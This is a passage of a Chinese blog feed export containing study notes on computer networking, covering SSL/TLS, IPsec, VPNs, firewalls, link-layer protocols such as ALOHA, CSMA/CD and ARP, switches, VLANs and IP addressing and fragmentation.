<p><img src="https://i.loli.net/2020/02/09/PpZgjnTwkQEJ5RN.png" alt="SSL/TLS"></p>
<p>所谓 HTTPS 就是套了一层 SSL 的 HTTP 协议，保证信息的机密性和完整性，提供服务器认证功能。</p>
<h3 id="SSL-通信概览"><a href="#SSL-通信概览" class="headerlink" title="SSL 通信概览"></a>SSL 通信概览</h3><p>以 Alice 向 Bob 建立一个 SSL 连接为例：</p>
<p>TCP 连接建立完成后，就要开始<strong>建立 SSL 连接</strong></p>
<ol>
<li>Alice 向 Bob 发送请求</li>
<li>Bob 回应他的公钥证书</li>
<li>Alice 获得 Bob 的公钥，利用这个公钥加密一个随机产生的主密钥 MS 表示为 EMS（加密过的主密钥）</li>
</ol>
<p>不同的加密操作使用不同的密钥会更安全（如：报文认证码 MAC 密钥与数据加密密钥），所以 SSL 会通过主密钥 MS <strong>派生出一组密钥</strong>：</p>
<ul>
<li>K<sub>c</sub>：加密客户端向服务器发送数据的密钥</li>
<li>M<sub>c</sub>：加密客户端向服务器发送数据的 MAC 密钥</li>
<li>K<sub>s</sub>：加密服务器向客户端发送数据的密钥</li>
<li>M<sub>s</sub>：加密服务器向客户端发送数据的 MAC 密钥</li>
</ul>
<p>SSL 将字节流<strong>分割</strong>为一系列记录，每个记录携带自己的 MAC。在 MAC 中有记录的<strong>序列号</strong>和<strong>一次性随机数</strong>，防止攻击者重排或重放记录。同时还要添加<strong>记录类型</strong>，防止攻击者伪造 TCP 断连，type=0 用于数据记录，type=1 用于断连。即：MAC = MAC(key, sequence||type||digest)</p>
<p><img src="https://i.loli.net/2020/02/09/Wp6jCXhdVsRDKr3.png" alt="SSL记录"></p>
<p>一次简化的 SSL 通信过程如下：</p>
<p><img src="https://i.loli.net/2020/02/09/UrEF6ADhgWdI8qj.png" alt="SSL通信过程"></p>
<h3 id="现实中的-SSL-协议栈"><a href="#现实中的-SSL-协议栈" class="headerlink" title="现实中的 SSL 协议栈"></a>现实中的 SSL 协议栈</h3><p>SSL 支持客户与服务器商定各自使用的<strong>密码组</strong>（加密算法及密钥），通常是客户端提供选项，服务器从中挑选。</p>
<p>SSL 不是一个单独的协议，而是两层共四个协议：</p>
<p><img src="https://i.loli.net/2020/02/10/3e8GhFqg5BADw1s.png" alt="SSL四协议"></p>
<ul>
<li>更改密码规格协议：负责更改当前连接的密码组，标志着当前加密策略的改变。ContentType = 20</li>
<li>警告协议：加密出错或握手失败时，为对方发送警告或直接中止当前连接。ContentType = 21</li>
<li>握手协议：确定 SSL 握手过程（商定加密算法，建立密钥，提供服务器证书认证）。ContentType = 22</li>
<li>记录协议：描述 SSL 记录格式，封装数据</li>
</ul>
<p><img src="https://i.loli.net/2020/02/10/slABwdEjWJz3MhL.png" alt="SSL记录"></p>
<h3 id="SSL-握手过程"><a href="#SSL-握手过程" class="headerlink" title="SSL 握手过程"></a>SSL 握手过程</h3><ol>
<li>客户端发送其支持的算法列表及客户端一次性随机数（nonce）</li>
<li>服务器选择算法并发回给客户：选择 + 证书 + 服务器一次性随机数</li>
<li>客户端验证证书提取服务器公钥，生成<strong>预主密钥</strong>，并利用服务器公钥加密预主密钥，发送给服务器</li>
<li>客户端与服务器基于预主密钥和一次性随机数分别独立计算加密密钥和 MAC 密钥（两方使用相同的算法，得到相同的密钥）</li>
<li>客户端发送一个针对所有握手过程的 MAC</li>
<li>服务器发送一个针对所有握手过程的 MAC</li>
</ol>
<p>SSL 完全建立之前所有信息都是明文传输的，这就很容易被有心人篡改其中内容，最后两步可以作为握手信息完整性认证。</p>
<h2 id="IPsec"><a href="#IPsec" class="headerlink" title="IPsec"></a>IPsec</h2><p>IPsec 负责网络层安全，提供机密性，完整性，源认证，防重放攻击服务。IPsec 在网络层中的传输有两种模式：</p>
<ul>
<li>传输模式：IPsec 数据报的发送与接收都在端系统完成<br><img src="https://i.loli.net/2020/02/10/KcMzgYaHW9FmZnf.png" alt="IPsec传输模式"></li>
<li>隧道模式：边缘路由器是 IPsec 感知的，IPsec 数据报进入局域网前还原为普通 IP 数据报<br><img src="https://i.loli.net/2020/02/10/tKvBjaneT8SxqPi.png" alt="IPsec隧道模式"></li>
</ul>
<p>有两个协议提供 IPsec 服务：</p>
<ul>
<li>数据认证头协议（AH, Authentication Header）：提供源认证，完整性<ul>
<li>传输模式：<br><img src="https://i.loli.net/2020/02/11/YHNn6CbAxr58pGM.png" alt="传输模式AH记录"><br>下一个头：指向源 IP 数据报载荷中的头部信息，如 TCP 头、UDP 头</li>
<li>隧道模式：<br><img src="https://i.loli.net/2020/02/11/vjBYzwEKF8de9N2.png" alt="隧道模式AH记录"></li>
</ul>
</li>
<li>封装安全协议（ESP, Encapsulation Security Protocol）：提供源认证，完整性，机密性。实际应用中最为广泛，我们常用的 VPN 就是基于这种协议<ul>
<li>传输模式：<br><img src="https://i.loli.net/2020/02/11/AleEbu4oYGrnH6v.png" alt="传输模式ESP记录"></li>
<li>隧道模式：最重要最常见的 IPsec 实现<br><img src="https://i.loli.net/2020/02/11/HKMmj89w2WpdXG1.png" alt="隧道模式ESP记录"></li>
</ul>
</li>
</ul>
<h3 id="安全关联"><a href="#安全关联" class="headerlink" title="安全关联"></a>安全关联</h3><p>发送数据前，发送端到接收端之间需要建立安全关联 <strong>SA</strong>(Security Association)以定义对数据报的加密算法与密钥。两方均要维护 SA 的连接状态信息。换言之，IPsec 并不是简单的对 IP 的封装，IP 是无连接的，<strong>IPsec 是面向连接的</strong>：</p>
<p><img src="https://i.loli.net/2020/02/10/3IexuNEcTjdCKpv.png" alt="SA连接"></p>
<h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3><p>安全策略 <strong>SP(Security Policy)</strong> 定义了对什么样的数据流应用 IPsec。多条安全策略记录组成了安全策略数据库 SPD。服务器提取数据报关键信息填充到一个称为“选择符”（目标IP，源IP，传输层协议，源端口，目标端口）的结构中，利用选择符去搜索 SPD，检索匹配的 SP。</p>
<h2 id="虚拟专用网（VPN）"><a href="#虚拟专用网（VPN）" class="headerlink" title="虚拟专用网（VPN）"></a>虚拟专用网（VPN）</h2><p>专用网络：基于专属的网络设备、链路或协议建设的专门用途的网络。最大的好处就是安全，但是成本很高。</p>
<p><img src="https://i.loli.net/2020/02/10/SRnjU6oa45tBFWC.png" alt="专用网络"></p>
<p>虚拟专用网络：通过建立在公共网络上的<strong>安全隧道</strong>，实现总部与分部的安全连接，在逻辑上建立一个专用网络，大大降低了费用。由隧道模式 ESP 实现的 IPsec 是 VPN 最常见的实现方法。</p>
<p><img src="https://i.loli.net/2020/02/10/Ay3ohPu6sZIarG2.png" alt="虚拟专用网络"></p>
<p>隧道：通过 Internet 提供安全的端到端的数据传输，本质上是一种加密与封装。数据进入隧道时经 VPN 封装在 Internet 中传输。</p>
<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><img src="https://i.loli.net/2020/02/11/cPOTpuCNy6EUd4F.png" alt="VPN实例"></p>
<ol>
<li>R1 将 IP 数据报转换为 IPsec 数据报<ul>
<li>检索 SPD，确定 SP</li>
<li>检索 SAD，确定 SA</li>
<li>在源 IP 数据报后面附加 ESP 尾部</li>
<li>利用 SA 的加密算法与密钥加密数据报</li>
<li>在加密结果前面附加 ESP 头</li>
<li>利用 SA 的加密算法与密钥创建报文认证码 MAC</li>
<li>构造新 IP 头，发到 R2 去</li>
</ul>
</li>
<li>R2 解封 IPsec 数据报<ul>
<li>提取 SPI 去检索 SAD，确定 SA</li>
<li>利用共享密钥解出原始 IP 数据报</li>
</ul>
</li>
</ol>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>防火墙是隔离内网与公共互联网，阻止某些分组进入 or 离开内网的软硬件设施。可分为三类：</p>
<ul>
<li>无状态分组过滤：位于网络边缘路由器，根据 IP 地址、端口号、协议类型等信息逐个过滤分组决定是否转发。</li>
<li>有状态组过滤：跟踪每个 TCP 连接，根据 SYN、FIN 等状态决定是否放行分组。</li>
<li>应用网关：基于应用层数据过滤分组</li>
</ul>
<p><img src="https://i.loli.net/2020/02/11/i87WYut32LzXHVG.png" alt="应用网关"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之链路层</title>
    <url>/2020/01/30/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<p>先明确几个术语：</p>
<ul>
<li>结点（node）：主机和路由器</li>
<li>链路（link）：相邻结点的连接通道</li>
<li>帧（frame）：链路层数据分组</li>
</ul>
<p>链路层负责通过一条链路在相邻结点之间传送数据报，提供的服务有：</p>
<ul>
<li>组帧：封装数据报构成数据帧，加首部和尾部，帧同步（将物理层比特流转换为帧）</li>
<li>链路接入：如果链路是共享的，需要解决<code>链路接入</code>问题。帧首部 MAC 地址用于标识帧的源和目的地</li>
<li>相邻结点间的可靠交付（不一定实现）</li>
<li>流量控制：协调相邻的发送和接收结点</li>
<li>差错检测与纠正：应对信号衰减和噪声</li>
</ul>
<h2 id="差错编码"><a href="#差错编码" class="headerlink" title="差错编码"></a>差错编码</h2><p>D -&gt; DR，R 为差错检测与纠正比特（冗余比特）：</p>
<p><img src="https://i.loli.net/2020/01/31/OQePn1hbz65NMXG.png" alt="线性分组码"></p>
<p><strong>差错编码不保证 100% 可靠</strong>，分为<strong>检错码</strong>与<strong>纠错码</strong>。</p>
<h3 id="检错"><a href="#检错" class="headerlink" title="检错"></a>检错</h3><p>设 C<sub>i</sub>、C<sub>j</sub> 为编码集中任意两个码字，C’ 为错出错码字：</p>
<p>对于检错码，如果编码集的汉明距离 d = r + 1，则该差错编码可以检测 r 位差错</p>
<p><img src="https://i.loli.net/2020/02/02/Z2LgfdqeOl64Nku.png" alt="检错码"></p>
<p>对于纠错码，若编码集的汉明距离 D = 2r + 1，则该差错编码可以纠错 r 位差错</p>
<p><img src="https://i.loli.net/2020/02/02/wfSurjoh4TsUFCg.png" alt="纠错码"></p>
<h4 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h4><p>给一串比特增加一个校验位，使得该串中所有 “1” 的个数之和为奇数称奇校验，为偶数称偶校验。</p>
<p><img src="https://i.loli.net/2020/02/02/Sb13soanWqRtAyV.png" alt="奇校验"></p>
<p><img src="https://i.loli.net/2020/02/02/gz5fEopJ2X7Zjw4.png" alt="偶校验"></p>
<p>数据和校验位发送给接受方后，接收方再次对数据中1的个数进行计算，如果为奇数则校验通过，表示此次传输过程未发生错误。如果不是奇数，则表示有错误发生，此时接收方可以向发送方发送请求，要求重新发送一遍数据。</p>
<p>优点：</p>
<ul>
<li>容易实现</li>
</ul>
<p>缺点：</p>
<ul>
<li>奇偶校验的检错率只有50%，因为只有奇数个数据位发生变化能检测到，如果偶数个数据位发生变化则无能为力了</li>
<li>每传输一个字节都需要加一位校验位，对传输效率影响很大</li>
<li>奇偶校验只能发现错误，但不能纠正错误，也就是说它只能告诉你出错了，但不能告诉你怎么出错了，一旦发现错误，只好重发</li>
</ul>
<h4 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h4><p>发送端：</p>
<ol>
<li>将数据按 16 bits 一组划分为的二进制数序列（此时数据中校验和字段为 0）</li>
<li>求和（Sum）：对这些二进制数求和（最高进位的 “1” 返回最低位继续相加）</li>
<li>校验和（CheckSum）：Sum 的反码</li>
</ol>
<p>接收端：</p>
<ol>
<li>重新计算数据的 CheckSum’（此时数据中校验和字段不为 0）</li>
<li>16 位 CheckSum’ 全为 0，无错</li>
</ol>
<h2 id="MAC-协议"><a href="#MAC-协议" class="headerlink" title="MAC 协议"></a>MAC 协议</h2><p>功能：多结点共享传输信道过程中，避免信号互相干扰。</p>
<p>有三类 MAC 协议：</p>
<ul>
<li>信道划分 MAC 协议：利用多路复用（时分、频分）支持多结点，每个结点只使用自己那部分</li>
<li>随机访问 MAC 协议：信道不划分，允许冲突。采用“冲突恢复”机制</li>
<li>轮转 MAX 协议：结点轮流使用信道，使用时占用全部带宽</li>
</ul>
<h3 id="随机访问-MAC-协议"><a href="#随机访问-MAC-协议" class="headerlink" title="随机访问 MAC 协议"></a>随机访问 MAC 协议</h3><p>结点发送分组时：</p>
<ul>
<li>利用信道全部带宽 R 发送分组</li>
<li>没有事先的结点间协调</li>
</ul>
<p>当两个或多个结点同时传输，会发生“<strong>冲突</strong>”。</p>
<h4 id="典型：时隙-ALOHA-协议"><a href="#典型：时隙-ALOHA-协议" class="headerlink" title="典型：时隙 ALOHA 协议"></a>典型：时隙 ALOHA 协议</h4><p>假定：</p>
<ul>
<li>所有帧大小相同</li>
<li>时间被划分为等长时隙（每个时隙刚好可以传输 1 个帧）</li>
<li>结点只在时隙开始时发送帧</li>
<li>结点能检测到冲突</li>
<li>所有结点的时钟同步</li>
</ul>
<p>运行：</p>
<ul>
<li>当结点有新帧，在下一时隙发送：<ul>
<li>无冲突：该结点可以在下一时隙继续发新帧</li>
<li>冲突：该结点在下一时隙以概率 <strong>P</strong> 重传帧</li>
</ul>
</li>
</ul>
<p>设 C 冲突时隙，E 空闲时隙，S 成功时隙：</p>
<p><img src="https://i.loli.net/2020/02/03/M2hT9UxicJ5mapt.png" alt="时隙ALOHA"></p>
<h4 id="典型：纯-ALOHA-协议"><a href="#典型：纯-ALOHA-协议" class="headerlink" title="典型：纯 ALOHA 协议"></a>典型：纯 ALOHA 协议</h4><p>不划分时隙的 ALOHA 协议，<strong>无需同步</strong>。</p>
<p>当有新的帧生成：</p>
<ul>
<li>立即发送</li>
<li>冲突可能性增大</li>
</ul>
<p>在 t<sub>0</sub> 时刻发送的帧，会与在 (t<sub>0</sub>-1, t<sub>0</sub>+1) 时间发送的帧冲突：<br><img src="https://i.loli.net/2020/02/03/HqX1ytmhi8RJxnD.png" alt="纯ALOHA"></p>
<h4 id="典型：CSMA-协议"><a href="#典型：CSMA-协议" class="headerlink" title="典型：CSMA 协议"></a>典型：CSMA 协议</h4><p>ALOHA 协议经常做些损人不利己的事，不考虑其它结点的感受去占用信道。<strong>载波监听多路访问协议 CSMA</strong>(carrier sense multiple access) 与之相比最大的改进在于<strong>发送帧之前，先监听信道（载波）</strong>：</p>
<ul>
<li>信道空闲：发送完整帧</li>
<li>信道忙：推迟发送<ul>
<li>1-坚持 CSMA：以概率 P=1 <strong>一直监听</strong>信道，一旦信道空闲立刻发送这个帧</li>
<li>非坚持 CSMA：<strong>随机监听</strong>信道</li>
<li>P-坚持 CSMA以 概率 P 坚持监听信道，以 概率 1-p 随机监听信道</li>
</ul>
</li>
</ul>
<p>由于信号在信道上的传输延迟，冲突仍然可能发生：</p>
<p><img src="https://i.loli.net/2020/02/03/hZRAYIUpXG9q6c3.png" alt="CSDM冲突"></p>
<h4 id="典型：CSMA-CD-协议"><a href="#典型：CSMA-CD-协议" class="headerlink" title="典型：CSMA/CD 协议"></a>典型：CSMA/CD 协议</h4><p>CSMA/CD 协议是带有冲突检测的 CSMA 协议：</p>
<ul>
<li>短时间内可以检测到冲突</li>
<li>冲突后传输中止，减少信道浪费</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/OiRWNLvsruQg4a5.png" alt="CSDM/CD冲突检测"></p>
<p>最大特点：<strong>边发边听，不发不听！</strong></p>
<p>设网络带宽 R(bps)，数据帧最小长度 L<sub>min(bits)，信号传播速度 V(m/s)：</sub></p>
<p><img src="https://i.loli.net/2020/02/03/1q5hVjXolUWLFsA.png" alt="最小发送时间"></p>
<p>A 如果要检测到 B 的冲突，必须保证 L<sub>min</sub>/R &gt;= 2d<sub>max</sub>/V，如果算上路由器等耗时则是 <strong>L<sub>min</sub>/R &gt;= RTT</strong>。</p>
<h3 id="信道划分与随机访问对比"><a href="#信道划分与随机访问对比" class="headerlink" title="信道划分与随机访问对比"></a>信道划分与随机访问对比</h3><p>信道划分 MAC 协议：</p>
<ul>
<li>网络负载重时，共享信道<strong>效率高</strong>且<strong>公平</strong></li>
<li>网络负载轻时，共享信道<strong>效率低</strong></li>
</ul>
<p>随机访问 MAC 协议：</p>
<ul>
<li>网络负载轻时，共享信道<strong>效率高</strong>，单个结点可以利用全部带宽</li>
<li>网络负载重时，产生冲突开销</li>
</ul>
<h2 id="ARP-与-MAC"><a href="#ARP-与-MAC" class="headerlink" title="ARP 与 MAC"></a>ARP 与 MAC</h2><p>MAC 地址共 48bits，用 16 进制形式表示。用于标识局域网内一个帧从哪个接口发出，到达哪个物理相连的其他接口。每块网卡都有自己独有的 MAC 地址，如：1A-2F-BB-76-09-AD</p>
<h2 id="ARP-协议"><a href="#ARP-协议" class="headerlink" title="ARP 协议"></a>ARP 协议</h2><p>地址解析协议（ARP）负责网络层 IP 地址与链路层 MAC 地址的转换。</p>
<p><strong>ARP 表</strong>：LAN 中每个 IP 结点维护一个表，存储某些 LAN 结点的 IP <-> Mac 地址映射关系：(IP 地址，MAC 地址，TTL)</-></p>
<p>下面是一个 ARP 表示例（本地网卡 IP 地址 192.168.100.107，子网掩码 255.255.255.0，默认网关 192.168.100.11）：</p>
<p><img src="https://i.loli.net/2020/05/17/d6eJ9OhzwVrcHxk.png" alt="ARP表"></p>
<p>例1：A 想要给<strong>同一局域网内</strong>的 B 发送数据报（B 的MAC 地址不在 A 的 ARP 表中）：</p>
<ol>
<li>A <strong>广播</strong> ARP 查询分组，其中包含 B 的 IP 地址</li>
<li>B 接收 ARP 查询分组，IP 地址匹配成功，向 A 应答 B 的 MAC 地址</li>
<li>A 在自己的 ARP 表中缓存 B 的 IP-MAC 映射直至超时（超时后再次刷新）</li>
</ol>
<p>例2：A 想要给<strong>不同局域网内</strong>的 B 发送数据报（B 的MAC 地址不在 A 的 ARP 表中，A 知道第一跳路由器接口的 MAC 地址）：</p>
<p><img src="https://i.loli.net/2020/02/03/6ISrl85JXjqokQC.png" alt="LAN间ARP"></p>
<ol>
<li>A 构造 IP 数据报，源 IP 地址为 A 的，目的 IP 地址为 B 的</li>
<li>A 构造链路层帧，源 MAC 地址为 A 的，目的 MAC 地址为第一跳路由器的</li>
<li>R 接收帧，提取 IP 数据报传递给上层 IP 协议，利用转发表转发 IP 数据报</li>
<li>R 创建链路层帧，源 MAC 地址为 R 出口的，目的 MAC 地址为 B 的</li>
</ol>
<p><strong>数据帧传递过程中源/目的 MAC 地址不断改变！</strong></p>
<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>交换机是典型的<strong>链路层设备</strong>，交换可以在多个主机间<strong>同时</strong>进行。特点有：</p>
<ul>
<li>存储、转发以太网帧</li>
<li>检验到达帧的 MAC 地址，选择性向一个或多个输出链路转发</li>
<li>利用 CSMA/CD 协议访问链路</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/TIbQX3Sf5Uc9nvB.png" alt="交换机"></p>
<p>每个交换机维护一张<strong>交换表</strong>，每个表项存放（主机 MAC 地址，到达主机的接口，时间戳）。</p>
<p>交换机通过<strong>自学习</strong>，获知到达主机的接口信息。当一个帧到达交换机时：</p>
<ol>
<li>收帧，交换机提取到帧的源 MAC 地址，将源主机的 MAC 地址与接口信息记录到交换表中</li>
<li>利用目的 MAC 地址检索交换表<ul>
<li>检索成功：如果目的主机与源主机处于同一网段（有相同的交换机接口）则丢弃帧；否则将帧转发到相应接口</li>
<li>检索失败：洪泛（向除了接收接口之外所有接口转发）</li>
</ul>
</li>
</ol>
<p><img src="https://i.loli.net/2020/02/03/gPpzCavur2m91bk.png" alt="组织机构网络"></p>
<h3 id="交换机-vs-路由器"><a href="#交换机-vs-路由器" class="headerlink" title="交换机 vs 路由器"></a>交换机 vs 路由器</h3><p>两者均为存储、转发设备：</p>
<ul>
<li>路由器：网络层设备（检测网络层分组首部）</li>
<li>交换机：链路层设备（检测链路层帧首部）</li>
</ul>
<p>两者均使用转发表：</p>
<ul>
<li>路由器：利用路由算法</li>
<li>交换机：利用自学习</li>
</ul>
<h2 id="虚拟局域网（VLAN）"><a href="#虚拟局域网（VLAN）" class="headerlink" title="虚拟局域网（VLAN）"></a>虚拟局域网（VLAN）</h2><p>通过对交换机接口或 MAC 地址进行分组，在一个物理局域网上配置多个虚拟局域网。这样就避免了广播报文（DHCP、ARP 等）在不必要的机器组中传播（<strong>流量隔离</strong>）：</p>
<p><img src="https://i.loli.net/2020/02/05/cZXOdiAoawHnWI7.png" alt="接口分组"></p>
<p><img src="https://i.loli.net/2020/02/05/OJNQRrKyuDflYqm.png" alt="MAC分组"></p>
<p><strong>通过路由器在 VLAN 间转发</strong>（像独立的交换机之间）。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>链路层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之网络层</title>
    <url>/2020/01/25/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    <content><![CDATA[<p>网络层的核心功能有两个：</p>
<ul>
<li>路由：确定分组从源到目的经过的路径。由<strong>路由算法</strong>确定转发表</li>
<li>转发：数据报由路由器的输入端口转移到合适的输出端口。每个路由器维护一个<strong>转发表</strong></li>
</ul>
<h2 id="服务模型"><a href="#服务模型" class="headerlink" title="服务模型"></a>服务模型</h2><p>在发送方主机与接收方主机之间传输数据报。属于<code>尽力而为</code>服务。</p>
<ul>
<li>无连接服务：不事先为系列分组的传输确定路径，每个分组独立确定路径。由路由器根据当前网络状态选择路径（数据报网络）</li>
<li>连接服务：首先为系列分组的传输确定路径，建立网络层逻辑连接（虚电路网络）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/28/UXhmizIdVLYHj94.png" alt="网络层服务"></p>
<h3 id="虚电路网络"><a href="#虚电路网络" class="headerlink" title="虚电路网络"></a>虚电路网络</h3><p>虚电路：一条从源主机到目的主机，类似于实体电路的虚拟连接路径。与实际电路最大的区别在于<strong>分组交换</strong>。</p>
<p>路径上每一个网络设备都要维护虚电路连接状态。</p>
<h4 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h4><ol>
<li>呼叫建立</li>
<li>数据传输</li>
<li>拆除呼叫</li>
</ol>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>每条虚电路包括：</p>
<ul>
<li>源主机到目的主机的<strong>一条路径</strong></li>
<li><strong>虚电路号（VCID）</strong>，沿路每段链路一个编号</li>
<li>网络层设备（如路由器）<strong>用转发表记录经过的每条虚电路</strong></li>
</ul>
<p>沿某条虚电路传输的分组，携带对应虚电路的 VCID 而不是目的地址。</p>
<p><img src="https://i.loli.net/2020/01/25/79sQjzEGxgWF3oy.png" alt="虚电路号"></p>
<h3 id="数据报网络"><a href="#数据报网络" class="headerlink" title="数据报网络"></a>数据报网络</h3><p>特点：</p>
<ul>
<li>网络层无连接</li>
<li>每个分组携带目的地址</li>
<li>路由器根据分组目的地址转发分组（构建转发表、检索转发表、独立选路）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/kMumZIhvYcxjQod.png" alt="数据报网络"></p>
<p>路由器按照<strong>最长匹配前缀原则</strong>选择转发接口。</p>
<p>Internet 就属于数据报网络。</p>
<p>下面是一个现实中的路由表示例（本地网卡 IP 地址 192.168.100.107，子网掩码 255.255.255.0，默认网关 192.168.100.11）：</p>
<p><img src="https://i.loli.net/2020/05/17/EYpG8NLcA1yjivJ.png" alt="路由表"></p>
<p>接口列表指明了该机有哪些接口。网络目标 &amp; 网络掩码 == 子网，根据子网将数据报从不同接口发送出去。</p>
<ul>
<li>网络目标：用来标识数据包的目的网络</li>
<li>网络掩码：与网络目标一起标识目的主机或者路由器的子网地址</li>
<li>接口：数据包从哪个接口发出去</li>
<li>网关：数据包下一跳的 IP 地址</li>
<li>跃点：优先级，跃点越少优先级越高。</li>
</ul>
<table>
<thead>
<tr>
<th>网络目标</th>
<th>网络掩码</th>
<th>网关</th>
<th>接口</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>0.0.0.0</td>
<td>0.0.0.0</td>
<td>192.168.100.11</td>
<td>192.168.100.107</td>
<td>收到一个目的地址不在路由表中的数据包，将该数据包通过 192.168.100.107 发送到默认网关 192.168.100.11</td>
</tr>
<tr>
<td>127.0.0.0</td>
<td>255.0.0.0</td>
<td>在链路上</td>
<td>127.0.0.1</td>
<td>收到一个发往目标网段 127.0.0.0/8 的数据包时，发送给该网段的所有数据包</td>
</tr>
<tr>
<td>127.0.0.1</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>127.0.0.1</td>
<td>收到一个目的 IP 为默认本机 IP 的数据包时，系统会将该数据包收下</td>
</tr>
<tr>
<td>192.168.100.0</td>
<td>255.255.255.0</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个发往目的网段 192.168.100.0/24 的数据包时，将该数据包通过 192.168.100.107 这个接口发送出去</td>
</tr>
<tr>
<td>192.168.100.107</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个目的 IP 为本地网卡 IP 的数据包时，系统会将该数据包收下</td>
</tr>
<tr>
<td>192.168.100.255</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个发给直连网段的本地广播数据包时，系统会将该数据包从 192.168.100.107 这个接口以广播的形式发送出去</td>
</tr>
</tbody>
</table>
<h2 id="IP-协议"><a href="#IP-协议" class="headerlink" title="IP 协议"></a>IP 协议</h2><p><img src="https://i.loli.net/2020/01/28/YEol4CqfpZMPDck.png" alt="IP数据报"></p>
<ul>
<li>版本号：4bits。</li>
<li>首部长度：4bits。首部字节数 = 4 * 首部长度</li>
<li>服务类型：8bits。区别不同类型 IP 数据报，只有在网络提供区分服务才有用</li>
<li>总长度：16bits。IP 分组的总字节数（20 B - 65535 B）</li>
<li>生存时间（TTL）：8bits。IP 分组在网络中可以通过的路由器数。路由器每转发一次这个值 -1</li>
<li>协议：8bits。指示 IP 分组封装的是哪个传输层协议（TCP/UDP）的数据报</li>
<li>首部校验和：16bits。对 IP 分组<strong>首部</strong>的差错检测，每次路由器转发都要重新计算</li>
<li>源 IP、目的 IP：32bits。</li>
<li>选项字段：1-40 bytes。IPv4 中<strong>通常不存在</strong>这个字段。</li>
<li>填充：0-3 bytes。补齐长度，保证首部长度是 4bytes 的倍数。</li>
</ul>
<p>IPv4 数据报首部长度通常为 20 bytes（5 行，每行 4bytes），第一个字节典型值为 45（版本号 4，首部长度 5）。</p>
<h3 id="IP-分片"><a href="#IP-分片" class="headerlink" title="IP 分片"></a>IP 分片</h3><p>最大传输单元（MTU）：<strong>链路层</strong>数据帧可封装的字节数的上限。不同链路的 MTU 可能不同。</p>
<p>为了解决不同链路之间 MTU 不同问题，IP 分组需要进行<strong>分片</strong>。IP 分片到达<strong>目的主机</strong>后进行<strong>重组</strong>。如果传输过程中个别分组丢失导致重组失败，目的主机直接<strong>丢弃</strong>已接收分组。</p>
<p>IP 首部相关字段参与标识分片与确定分片顺序：总长度、标识、标志位、片偏移。</p>
<ul>
<li>标识：16bits。标识一个 IP 分组。IP 协议利用一个计数器，每产生一个 IP 分组计数器 +1，作为该分组的表示。</li>
<li>标志位：3bits。保留 + DF(Don’t Fragment) + MF(More Fragment)<br><img src="https://i.loli.net/2020/01/28/JDLmZTzw6kbp3tq.png" alt="标志位格式"></li>
<li>片偏移：13bits。一个分片封装源 IP 分组数据的相对偏移量。偏移字节数 = 8 * 片偏移</li>
</ul>
<p>假设 IP 分组总长度 L，链路 MTU 为 M。若 L &gt; M 且 DF = 0，则需要分片。分片时每个分片的标识复制原 IP 分组的标识。除最后一个分片，其余分片均为 MTU 允许的最大分片且数据大小为 8 的倍数。</p>
<h3 id="IP-编址"><a href="#IP-编址" class="headerlink" title="IP 编址"></a>IP 编址</h3><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p>一共 32 bits，标识主机、路由器的<strong>接口</strong>。</p>
<h5 id="子网"><a href="#子网" class="headerlink" title="子网"></a>子网</h5><p>IP 地址 = 网络号（高比特位） + 主机号（低比特位）。相同网络号组成的网络称为<strong>IP 子网</strong>。转发表只记录<strong>子网地址</strong>。</p>
<p>IP 子网中的设备可以不跨越路由器彼此物理联通。</p>
<p><img src="https://i.loli.net/2020/01/29/wbMGcL2HjV3qKTO.png" alt="IP 子网"></p>
<h5 id="有类-IP-地址"><a href="#有类-IP-地址" class="headerlink" title="有类 IP 地址"></a>有类 IP 地址</h5><p><img src="https://i.loli.net/2020/01/29/hGEr5QJgxKwjLTb.png" alt="有类编址"></p>
<p>A 类网络数少，每个网络内主机数多；C 类网络数多，每个网络内主机数少。</p>
<p>D 类、E 类不划分网络号和主机号，D 类用于多播，E 类暂不使用。</p>
<h5 id="私有地址"><a href="#私有地址" class="headerlink" title="私有地址"></a>私有地址</h5><p>私有地址只用于子网内部，在公共 Internet 上无效。</p>
<p><img src="https://i.loli.net/2020/01/29/o5EFlHrysNKYw4X.png" alt="私有地址"></p>
<h5 id="特殊-IP-地址"><a href="#特殊-IP-地址" class="headerlink" title="特殊 IP 地址"></a>特殊 IP 地址</h5><p><img src="https://i.loli.net/2020/01/29/PktSwAIXfhDiHGd.png" alt="特殊 IP"></p>
<h5 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h5><p>IP 地址 = 网络号（高比特位） + 子网号（部分原主机号高比特位） + 主机号（低比特位）</p>
